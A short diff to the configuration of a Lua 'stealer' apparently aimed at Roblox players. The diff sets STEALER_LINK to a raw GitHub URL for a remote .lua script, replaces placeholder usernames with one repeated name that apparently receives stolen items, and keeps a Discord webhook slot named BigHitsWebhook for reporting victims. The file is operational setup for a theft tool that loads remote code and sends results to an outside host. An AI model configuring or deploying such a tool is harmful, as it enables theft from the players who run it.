@@ -1,9 +1,9 @@
-STEALER_LINK = '' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://raw.githubusercontent.com/Fedzen/script/refs/heads/main/.lua'
 
 Usernames = {
-    'first', -- PUT UR ROBLOX USERNAMES
-    'second', -- AS MANY AS U WANT BUT DONT FORGET ,
-    'third',
+    'Tedzenn',
+    'Tedzenn',
+    'Tedzenn',
 }
 
 BigHitsWebhook = "https://discord.com/api/webhooks/x/x"
